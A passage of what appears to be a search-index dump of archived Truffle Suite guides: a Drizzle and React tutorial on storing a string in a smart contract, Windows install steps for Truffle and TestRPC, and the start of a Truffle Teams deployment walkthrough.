drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; We first assign the contract from the drizzle instance into contract , and then we call cacheSend() on the method we are interested in (i.e. set ). Then we pass in the string we want to set (i.e. value ) as well as our transaction options (in this case, just the from field). Note that we can get our current account address from drizzleState.accounts[0] . What we get in return is a stackId , which is a reference to the transaction that we want to execute. Ethereum transactions don't receive a hash until they're broadcast to the network. In case an error occurs before broadcast, Drizzle keeps track of these transactions by giving each it's own ID. Once successfully broadcasted, the stackId will point to the transaction hash, so we save it in our local component state for later usage. Tracking transaction status \u00b6 getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; Now that we have a stackId saved into our local component state, we can use this to check the status of our transaction. First, we need the transactions and transactionStack slices of state from drizzleState . Then, we can get the transaction hash (assigned to txHash ) via transactionStack[stackId] . If the hash does not exist, then we know that the transaction has not been broadcasted yet and we return null. Otherwise, we display a string to show the status of our transaction. Usually, this will either be \"pending\" or \"success\". The End \u00b6 Congratulations! You have taken a huge step to understanding how Drizzle works. Of course, this is only the beginning, you can use tools like drizzle-react to help you integrate Drizzle into your dapp, reducing the necessary boilerplate that you would have to write. Alternatively, you could also bootstrap your Drizzle dapp with our Truffle box .", "title": "Getting Started with Drizzle and React"}, {"location": "guides/getting-started-with-drizzle-and-react/#getting-started-with-drizzle-and-react", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Drizzle is the newest member of the Truffle Suite and our first front-end development tool. At its core, Drizzle takes care of synchronizing your contract data, transaction data and more from the blockchain to a Redux store. There are also higher-level abstractions on top of the base drizzle library; tools for React compatibility ( drizzle-react ) and a set of ready-to-use React components ( drizzle-react-components ). We're going to focus on the lower levels today, taking you through setting up a Truffle project with React and Drizzle from scratch. This way we can gain the best understanding of how Drizzle works under the hood. With this knowledge, you can leverage the full power of Drizzle with any front-end framework of your choosing, or use the higher-level React abstractions with confidence. This will be a very minimal tutorial focused on setting and getting a simple string stored in a contract. It's meant for those with a basic knowledge of Truffle, who have some knowledge of JavaScript and React.js, but who are new to using Drizzle. Note : For Truffle basics, please read through the Truffle Pet Shop tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project from scratch Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating our React.js project Wiring up the front-end client Wire up the React app with Drizzle Write a component to read from Drizzle Write a component to write to the smart contract", "title": "Getting Started with Drizzle and React"}, {"location": "guides/getting-started-with-drizzle-and-react/#setting-up-the-development-environment", "text": "There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node)", "title": "Setting up the development environment"}, {"location": "guides/getting-started-with-drizzle-and-react/#truffle", "text": "Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path.", "title": "Truffle"}, {"location": "guides/getting-started-with-drizzle-and-react/#create-react-app", "text": "Finally, since this is a React.js tutorial, we will be creating our React project with Create-React-App . You won't have to do anything if you have NPM version 5.2 or above. You can check your NPM version by running npm --version . If you do not, then you will need to install the tool globally with this command: npm install -g create-react-app", "title": "Create-React-App"}, {"location": "guides/getting-started-with-drizzle-and-react/#creating-a-truffle-project", "text": "Truffle initializes in the current directory, so first create a directory in your development folder of choice and then move inside it. mkdir drizzle-react-tutorial cd drizzle-react-tutorial Now we're ready to spawn our empty Truffle project by running the following command: truffle init Let's take a brief look at the directory structure that was just generated.", "title": "Creating a Truffle project"}, {"location": "guides/getting-started-with-drizzle-and-react/#directory-structure", "text": "The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts. truffle-config.js : Truffle configuration file.", "title": "Directory structure"}, {"location": "guides/getting-started-with-drizzle-and-react/#writing-our-smart-contract", "text": "We'll add a simple smart contract called MyStringStore. Create a new file named MyStringStore.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract MyStringStore { string public myString = \"Hello World\" ; function set ( string memory x ) public { myString = x ; } } Since this isn't a Solidity tutorial, all you need to know about this is: We've created a public string variable named myString and initialized it to \"Hello World\". This automatically creates a getter (since it's a public variable) so we don't have to write one ourselves. We've created a setter method that simply sets the myString variable with whatever string is passed in.", "title": "Writing our smart contract"}, {"location": "guides/getting-started-with-drizzle-and-react/#launching-a-test-blockchain-with-truffle-develop", "text": "Before we move ahead, let's first launch our test blockchain with the Truffle Develop console. Open up a new terminal, navigate to the project directory, and run the following command: truffle develop This will spawn a new blockchain that listens on 127.0.0.1:9545 by default.", "title": "Launching a test blockchain with Truffle Develop"}, {"location": "guides/getting-started-with-drizzle-and-react/#compiling-and-migrating-the-smart-contract", "text": "Now we are ready to compile and migrate our contract.", "title": "Compiling and migrating the smart contract"}, {"location": "guides/getting-started-with-drizzle-and-react/#compilation", "text": "In the Truffle Develop console, type the following command: compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/truffle/reference/configuration#resolving-naming-conflicts-on-windows). You should see output similar to the following: Compiling ./contracts/Migrations.sol... Compiling ./contracts/MyStringStore.sol... Writing artifacts to ./build/contracts", "title": "Compilation"}, {"location": "guides/getting-started-with-drizzle-and-react/#migration", "text": "Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! Note : Read more about migrations in the [Truffle documentation](/docs/truffle/getting-started/running-migrations). To create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: const MyStringStore = artifacts . require ( \"MyStringStore\" ); module . exports = function ( deployer ) { deployer . deploy ( MyStringStore ); }; Back in our Truffle Develop console, migrate the contract to the blockchain. migrate You should see the migrations being executed in order, with the details of each migration listed.", "title": "Migration"}, {"location": "guides/getting-started-with-drizzle-and-react/#testing-the-smart-contract", "text": "Before we proceed, we should write a couple tests to ensure that our contract works as expected. Create a new file named MyStringStore.js in the test/ directory. Add the following content to the MyStringStore.js file: const MyStringStore = artifacts . require ( \"./MyStringStore.sol\" ); contract ( \"MyStringStore\" , accounts => { it ( \"should store the string 'Hey there!'\" , async () => { const myStringStore = await MyStringStore . deployed (); // Set myString to \"Hey there!\" await myStringStore . set ( \"Hey there!\" , { from : accounts [ 0 ] }); // Get myString from public variable getter const storedString = await myStringStore . myString . call (); assert . equal ( storedString , \"Hey there!\" , \"The string was not stored\" ); }); });", "title": "Testing the smart contract"}, {"location": "guides/getting-started-with-drizzle-and-react/#running-the-tests", "text": "Back in the Truffle Develop console, run the tests: test If all the tests pass, you'll see console output similar to this: Using network 'develop'. Contract: MyStringStore \u2713 should store the string 'Hey there!' (98ms) 1 passing (116ms) Awesome! Now we know that the contract actually works.", "title": "Running the tests"}, {"location": "guides/getting-started-with-drizzle-and-react/#creating-our-reactjs-project", "text": "Now that we are done with the smart contract, we can write our front-end client with React.js! In order to do this, open another terminal, navigate to your project directory, and simply run this command (if you have NPM version 5.2 or above): npx create-react-app client If you have an older version of NPM , make sure Create-React-App is installed globally as per the instructions in the Setting up the development environment section and then run the following: create-react-app client This should create a client directory in your Truffle project and bootstrap a barebones React.js project for you to start building your front-end with.", "title": "Creating our React.js project"}, {"location": "guides/getting-started-with-drizzle-and-react/#wiring-up-the-front-end-client", "text": "Since Create-React-App's default behavior disallows importing files from outside of the src folder, we need to bring the contracts in our build folder inside src . We can copy and paste them every time we compile our contracts, but a better way is to simply configure Truffle to put the files there. In the truffle-config.js file, replace the contents with the following: const path = require ( \"path\" ); module . exports = { contracts_build_directory : path . join ( __dirname , \"client/src/contracts\" ) }; This will make sure to output the contract build artifacts directory inside your React project. But this also means we'll have to restart our Truffle Develop console. Press CTRL + C to exit out of the Truffle Develop console and then start it again with truffle develop . From there, make sure you run the compile and migrate commands again so that the new build artifacts will be output into the new folder. If you are encountering issues, try migrate --reset for a clean migration from scratch.", "title": "Wiring up the front-end client"}, {"location": "guides/getting-started-with-drizzle-and-react/#install-drizzle", "text": "This is the most delicious part, we install Drizzle. Make sure you are in the client directory and then run the following: npm install @drizzle/store And that's it for dependencies! Note that we don't need to install Web3.js or @truffle/contract ourselves. Drizzle contains everything we need to work reactively with our smart contracts.", "title": "Install Drizzle"}, {"location": "guides/getting-started-with-drizzle-and-react/#wire-up-the-react-app-with-drizzle", "text": "Before we go further, let's start our React app by running the follow command inside our client directory: npm start This will serve the front-end under localhost:3000 , so open that up in your browser. Note : Make sure to use an incognito window if you already have MetaMask installed (or disable MetaMask for now). Otherwise, the app will try to use the network specified in MetaMask rather than the develop network under `localhost:9545`. If the default Create-React-App page loaded without any issues, you may proceed.", "title": "Wire up the React app with Drizzle"}, {"location": "guides/getting-started-with-drizzle-and-react/#setup-the-store", "text": "The first thing we need to do is to setup and instantiate the Drizzle store. We are going add the following code to client/src/index.js : // import drizzle functions and contract artifact import { Drizzle } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup drizzle const drizzle = new Drizzle ( options ); First, we imported the tools from Drizzle as well as the contract definition. We then built our options object for Drizzle, which in this case is just specifying the specific contract we want to be loaded by passing in the JSON build artifact. And finally, we created the drizzleStore and used that to create our drizzle instance which we will pass in as a prop to our App component. Once that is complete, your index.js should look something like this: import React from 'react' ; import ReactDOM from 'react-dom' ; import './index.css' ; import App from './App' ; import * as serviceWorker from './serviceWorker' ; // import drizzle functions and contract artifact import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup the drizzle store and drizzle const drizzle = new Drizzle ( options ); ReactDOM . render ( < App drizzle = { drizzle } /> , document . getElementById ( 'root' )); Note again that the drizzle instance is passed into the App component as props.", "title": "Setup the store"}, {"location": "guides/getting-started-with-drizzle-and-react/#wire-up-the-app-component", "text": "Now that we have a drizzle instance to play around with, we can go into client/src/App.js to start working with the React API.", "title": "Wire up the App component"}, {"location": "guides/getting-started-with-drizzle-and-react/#adding-state-variables", "text": "First thing we will do is to add the following line inside our App component: state = { loading : true , drizzleState : null }; We are going to be using two state variables here: loading \u2014 Indicates if Drizzle has finished initializing and the app is ready. The initialization process includes instantiating web3 and our smart contracts, fetching any available Ethereum accounts and listening (or, in cases where subscriptions are not supported: polling) for new blocks. drizzleState \u2014 This is where we will store the state of the Drizzle store in our top-level component. If we can keep this state variable up-to-date, then we can simply use simple props and state to work with Drizzle (i.e. you don't have to use any Redux or advanced React patterns).", "title": "Adding state variables"}, {"location": "guides/getting-started-with-drizzle-and-react/#adding-some-initialization-logic", "text": "Next we will add in our componentDidMount method into the component class so that we can run some initialization logic. componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } First, we grab the drizzle instance from the props, then we call drizzle.store.subscribe and pass in a callback function. This callback function is called whenever the Drizzle store is updated. Note that this store is actually a Redux store under the hood, so this might look familiar if you've used Redux previously. Whenever the store is updated, we will try to grab the state with drizzle.store.getState() and then if Drizzle is initialized and ready, we will set loading to false, and also update the drizzleState state variable. By doing this, drizzleState will always be up-to-date and we also know exactly when Drizzle is ready so we can use a loading component to let the user know.", "title": "Adding some initialization logic"}, {"location": "guides/getting-started-with-drizzle-and-react/#unsubscribing-from-the-store", "text": "Note that we assign the return value of the subscribe() to a class variable this.unsubscribe . This is because it is always good practice to unsubscribe from any subscriptions you have when the component un-mounts. In order to do this, we save a reference to that subscription (i.e. this.unsubscribe ), and inside componentWillUnmount , we have the following: componentWillUnmount () { this . unsubscribe (); } This will safely unsubscribe when the App component un-mounts so we can prevent any memory leaks.", "title": "Unsubscribing from the store"}, {"location": "guides/getting-started-with-drizzle-and-react/#replace-the-render-method", "text": "Finally, we can replace the boilerplate render method with something that applies to us better: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } In the next section, we will replace \"Drizzle is ready\" with an actual component that will read from the store. If you refresh your browser and run this app now, you should see \"Loading Drizzle...\" briefly flash on screen and then subsequently \"Drizzle is ready\".", "title": "Replace the render method"}, {"location": "guides/getting-started-with-drizzle-and-react/#full-component-code", "text": "When you are done this section, your App component should look like the following: class App extends Component { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } }", "title": "Full component code"}, {"location": "guides/getting-started-with-drizzle-and-react/#write-a-component-to-read-from-drizzle", "text": "First, let's create a new file at client/src/ReadString.js and paste in the following: import React from \"react\" ; class ReadString extends React . Component { componentDidMount () { const { drizzle , drizzleState } = this . props ; console . log ( drizzle ); console . log ( drizzleState ); } render () { return < div > ReadString Component < /div>; } } export default ReadString ; And then inside App.js , import the new component with this statement: import ReadString from \"./ReadString\" ; Now modify your App.js render method so that we pass in the drizzle instance from props as well as the drizzleState from the component state: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } Go back to the browser and open up your console. You should see that the two console.log statements are working and they are displaying both the drizzle instance as well as a drizzleState that is fully initialized. What this tells us is that the drizzleState we get in this component will always be fully ready once this component mounts. At this point, you can take some time to explore the drizzle instance object as well as the drizzleState object.", "title": "Write a component to read from Drizzle"}, {"location": "guides/getting-started-with-drizzle-and-react/#drizzle-instance-and-drizzlestate", "text": "For the most part, drizzleState is there for you to read information from (i.e. contract state variables, return values, transaction status, account data, etc.), whereas the drizzle instance is what you will use to actually get stuff done (i.e. call contract methods, the Web3 instance, etc.).", "title": "drizzle instance and drizzleState"}, {"location": "guides/getting-started-with-drizzle-and-react/#wiring-up-the-readstring-component", "text": "Now that we have access to our drizzle instance and the drizzleState , we can put in the logic that allows us read the smart contract variable we are interested in. Here is what the full code of ReadString.js should look like: import React from \"react\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } } export default ReadString ; If everything is working, your app should display \"Hello World\". But first, let's walk through what we did here.", "title": "Wiring up the ReadString component"}, {"location": "guides/getting-started-with-drizzle-and-react/#when-the-component-mounts", "text": "componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } When the component mounts, we first grab a reference to the contract we are interested in and assign it to contract . We then need to tell Drizzle to keep track of a variable we are interested in. In order to do that, we call the .cacheCall() function on the myString getter method. What we get in return is a dataKey that allows us to reference this variable. We save this to the component's state so we can use it later.", "title": "When the component mounts"}, {"location": "guides/getting-started-with-drizzle-and-react/#the-render-method", "text": "render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } From the drizzleState , we grab the slice of the state we are interested in, which in this case is the MyStringStore contract. From there, we use the dataKey we saved from before in order to access the myString variable. Finally, we write myString && myString.value to show the value of the variable if it exists, or nothing otherwise. And in this case, it should show \"Hello World\" since that is the string the contract is initialized with.", "title": "The render method"}, {"location": "guides/getting-started-with-drizzle-and-react/#quick-recap", "text": "The most important thing to get out of this section here is that there are two steps to reading a value with Drizzle: First, you need to let Drizzle know what variable you want to watch for. Drizzle will give you a dataKey in return and you need to save it for later reference. Second, due to the asynchronous nature of how Drizzle works, you should be watching for changes in drizzleState . Once the variable accessed by the dataKey exists, you will be able to get the value you are interested in.", "title": "Quick Recap"}, {"location": "guides/getting-started-with-drizzle-and-react/#write-a-component-to-write-to-the-smart-contract", "text": "Of course, simply reading a pre-initialized variable is no fun at all; we want something that we can interact with. In this section, we will create an input box where you can type a string of your choice and have it save to the blockchain forever! First, let's create a new file client/src/SetString.js and paste in the following: import React from \"react\" ; class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } export default SetString ; At this point, import and include it inside App.js just like you did with the ReadString component: import SetString from \"./SetString\" ; // ... render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } At this point, the app should work and you should try it out. You should be able to type something into the input text box, hit Enter, and Drizzle's react store will automatically display the new string. Next, let's go through SetString.js step-by-step.", "title": "Write a component to write to the smart contract"}, {"location": "guides/getting-started-with-drizzle-and-react/#general-structure", "text": "First let's take a look at the general React.js boilerplate that we need. class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { ... }; getTxStatus = () => { ... }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } In this component, we will have an input text box for the user to type in a string, and when the Enter key is pressed, the setValue method will be called with the string as a parameter. Also, we will display the status of the transaction. The getTxStatus method will return a string displaying the status of the transaction by referencing a stackId state variable (more on this later).", "title": "General structure"}, {"location": "guides/getting-started-with-drizzle-and-react/#submitting-the-transaction", "text": "setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; We first assign the contract from the drizzle instance into contract , and then we call cacheSend() on the method we are interested in (i.e. set ). Then we pass in the string we want to set (i.e. value ) as well as our transaction options (in this case, just the from field). Note that we can get our current account address from drizzleState.accounts[0] . What we get in return is a stackId , which is a reference to the transaction that we want to execute. Ethereum transactions don't receive a hash until they're broadcast to the network. In case an error occurs before broadcast, Drizzle keeps track of these transactions by giving each it's own ID. Once successfully broadcasted, the stackId will point to the transaction hash, so we save it in our local component state for later usage.", "title": "Submitting the transaction"}, {"location": "guides/getting-started-with-drizzle-and-react/#tracking-transaction-status", "text": "getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; Now that we have a stackId saved into our local component state, we can use this to check the status of our transaction. First, we need the transactions and transactionStack slices of state from drizzleState . Then, we can get the transaction hash (assigned to txHash ) via transactionStack[stackId] . If the hash does not exist, then we know that the transaction has not been broadcasted yet and we return null. Otherwise, we display a string to show the status of our transaction. Usually, this will either be \"pending\" or \"success\".", "title": "Tracking transaction status"}, {"location": "guides/getting-started-with-drizzle-and-react/#the-end", "text": "Congratulations! You have taken a huge step to understanding how Drizzle works. Of course, this is only the beginning, you can use tools like drizzle-react to help you integrate Drizzle into your dapp, reducing the necessary boilerplate that you would have to write. Alternatively, you could also bootstrap your Drizzle dapp with our Truffle box .", "title": "The End"}, {"location": "guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. David Burela now recommends a different, updated way of doing this on his blog, which you can check out here: How to install Truffle & TestRPC on Ubuntu or Windows 10 with ?\"Windows subsystem for Linux\" Update : Since this tutorial was published, we have released Ganache , a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our Ganache Documentation This post was originally published by David Burela on his blog Burela's House-o-blog . Big thanks to David for allowing us publish it here! I have been doing a bunch of Blockchain development work, one of which was recently featured on the front page of the Australian Financial Review and on Microsoft\u2019s news website . One of the trickiest things has been trying to get Windows environments correctly configured, as the tools are npm based and want to be compiled natively and assumes it is on a Linux machine. Here is the simplest install script I have found Step 0. Pre-step: Install Chocolatey \u00b6 Install Chocolatey via https://chocolatey.org/ Step 1. Install Windows tools with Chocolatey: \u00b6 Open a PowerShell prompt as an Administrator and run the following commands (last command optional): $ choco install nodejs.install \u2013y $ choco install git \u2013y $ choco install VisualStudioCode -y Read more about configuring Visual Studio code for Blockchain development . Step 2. Install the tools via npm: \u00b6 Open a NEW PowerShell prompt as Administrator (to ensure that it reloads), then run the following commands: $ npm install -g npm $ npm install -g -production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle You may see some error messages during npm installs. Many of these are just informational / optional components failing. You can test that it is all working by trying to run the commands truffle and testrpc. Bonus Step: combining with Visual Studio Code \u00b6 This is how I use Truffle & Visual Studio code together. Make sure you install and configure Visual Studio Code with the Solidity extensions . If you navigate into the folder where your files are, typing \u201ccode .\u201d will open Visual Studio Code in the current folder. Running the command after a truffle init gets you up and running quickly", "title": "Truffle Suite"}, {"location": "guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/#step-0-pre-step-install-chocolatey", "text": "Install Chocolatey via https://chocolatey.org/", "title": "Step 0. Pre-step: Install Chocolatey"}, {"location": "guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/#step-1-install-windows-tools-with-chocolatey", "text": "Open a PowerShell prompt as an Administrator and run the following commands (last command optional): $ choco install nodejs.install \u2013y $ choco install git \u2013y $ choco install VisualStudioCode -y Read more about configuring Visual Studio code for Blockchain development .", "title": "Step 1. Install Windows tools with Chocolatey:"}, {"location": "guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/#step-2-install-the-tools-via-npm", "text": "Open a NEW PowerShell prompt as Administrator (to ensure that it reloads), then run the following commands: $ npm install -g npm $ npm install -g -production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle You may see some error messages during npm installs. Many of these are just informational / optional components failing. You can test that it is all working by trying to run the commands truffle and testrpc.", "title": "Step 2. Install the tools via npm:"}, {"location": "guides/how-to-install-truffle-and-testrpc-on-windows-for-blockchain-development/#bonus-step-combining-with-visual-studio-code", "text": "This is how I use Truffle & Visual Studio code together. Make sure you install and configure Visual Studio Code with the Solidity extensions . If you navigate into the folder where your files are, typing \u201ccode .\u201d will open Visual Studio Code in the current folder. Running the command after a truffle init gets you up and running quickly", "title": "Bonus Step: combining with Visual Studio Code"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/", "text": "In this tutorial, you'll learn how to deploy your smart contracts to a public Ethereum network using Truffle Teams. Prerequisites \u00b6 This tutorial assumes that you've already done the following: - Created a Truffle Teams account - Linked a repo that is a Truffle project (need a project? Grab our MetaCoin box with truffle unbox metacoin in an empty directory, and push that to your own repository) - Got a passing build within Truffle Teams - Grabbed some Ropsten Ether - Ensured you'll have a stable network connection The Deployments Page \u00b6 Head over to Truffle Teams . On the left navigation bar, click the item near the top labelled DEPLOYMENTS next to the parachute icon. Here you'll see a list of your repositories. Click on the one you'd like to deploy. This will bring you to the deployments page. You'll notice there are three columns: Commits , Staging , and Production . Commits Column \u00b6 Commits is a list of all the commits that Truffle Teams is processing, or has processed, as a build. Each will have a status icon to show if the build is in progress, failed, or successful. Commits with a successful icon (a green box with a checkmark, as pictured) will be able to be deployed; the parachute icon in the top right of the commit indicates this. Staging and Production Columns \u00b6 Staging contains a list of all testnet (i.e. Ropsten, G\u00f6rli, Rinkeby, and Kovan) deployments. Production contains a list of Mainnet deployments. We'll expand more on how these work later in the tutorial. Your First Deployment \u00b6 Currently, Truffle Teams supports Ethereum testnets and Mainnet, and we'll be adding support for other targets over time. In this tutorial, we'll be deploying our application to Ropsten. Press the parachute icon on the commit you'd like to deploy. A wizard will pop up; under Destination Network, select Ropsten, and then press Connect Wallet . MetaMask will pop up asking you to login (if you haven't already). Then you will need to press Connect to confirm the connection with Truffle Teams. If the wizard hasn't changed (i.e. you don't see a button to start deploying), you likely need to switch your MetaMask network to Ropsten. This may reload the page; if this happens, you'll need to repeat the steps above. Before moving on, make sure you have the correct account selected in MetaMask. Now you should see the wizard prompting for a Deployment Context . Leave it set to Create a New Deployment . We'll cover what this is later in the tutorial. Press the OK, START DEPLOYING button! From here on, it's important that you don't close the tab, refresh the page, or lose network connection. We're working on a more robust experience that will enable you to pick up unfinished deployments, but for now our current version requires the tab to stay open and connected. Truffle Teams will only process so many deployments at the same time, so you may see that your deployment has been queued. You'll have to wait (without closing/refreshing the tab) for your deployment to get to the front of the list. However, we're working diligently to make this experience more seamless going forward. Once your deployment has started processing, you'll see a list of steps Truffle Teams is doing to prepare for your deployment. Once the preparation steps are complete, you'll see a screen with a list of your migrations being processed. You should also get a pop-up from MetaMask for your first transaction. You'll notice that this interface with MetaMask is like sending a transaction to any other dapp. It's your account that is sending this transaction, and you have complete control of it. Additionally, we highly recommend that you change the GAS FEE to be higher so that your transactions run quicker. For testnets like Ropsten, it's affordable to always select the Fast option. Once you're happy with the transaction gas fee, press the Confirm button to send your transaction. Once the transaction is confirmed (the timing of confirmations from MetaMask and Truffle Teams may be slightly offset), you'll receive the next transaction. Repeat this process until you see a message that your deployment is being finalized. After a short wait, you'll see a window with your deployment results: Your contracts are deployed! That was easy. Go ahead and push the Great! Go Back to Workflow button or the X in the wizard. You'll now see a new card in the Staging column with the results of your deployment: You can click on the + Contracts bar on the bottom of the card to see a list of your deployed contracts and their addresses: You can also click the vertical 3 dots in the top right of the card to find a menu. In this menu, you can download a .zip file of the Truffle .json artifacts used in your frontend webapp, graduate a deployment to production, or archive the deployment. Note: Be careful when using the archive feature; we haven't implemented a way to unarchive deployments yet. Deployment Context \u00b6 Circling back to the Deployment Context feature I brushed over earlier when we were setting up our deployment: This setting will usually be used for more advanced Truffle applications that utilize the migration system to iteratively migrate more to the blockchain (rather than starting fresh each deployment). This option will let you select an existing deployment on the same network that you'd like to use the deployed artifacts for. Truffle supports the concept of migrating your application and will only run the new migration scripts from the last deployment (a.k.a. the deployment context). This becomes useful in a handful of scenarios: maybe you added an extra contract to work with your existing deployment, your Truffle project uses proxy contracts to upgrade your contracts, and more. Technically speaking, selecting the Deployment Context will put the Truffle artifacts from the deployment context you selected in the directory before running truffle migrate . Graduating Deployments \u00b6 Happy with a particular deployment in Staging ? You can select the Graduate option from the menu to use the same build as the basis of your deployment into Mainnet. Other than selecting a different network in MetaMask, the steps are the same! After you're done, you'll see a new deployment in the production section. Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams", "title": "Truffle Suite"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#prerequisites", "text": "This tutorial assumes that you've already done the following: - Created a Truffle Teams account - Linked a repo that is a Truffle project (need a project? Grab our MetaCoin box with truffle unbox metacoin in an empty directory, and push that to your own repository) - Got a passing build within Truffle Teams - Grabbed some Ropsten Ether - Ensured you'll have a stable network connection", "title": "Prerequisites"}, {"location": "guides/learn-how-to-deploy-with-truffle-teams/#the-deployments-page", "text": "Head over to Truffle Teams . On the left navigation bar, click the item near the top labelled DEPLOYMENTS next to the parachute icon. Here you'll see a list of your repositories. Click on the one you'd like to deploy. This will bring you to the deployments page. You'll notice there are 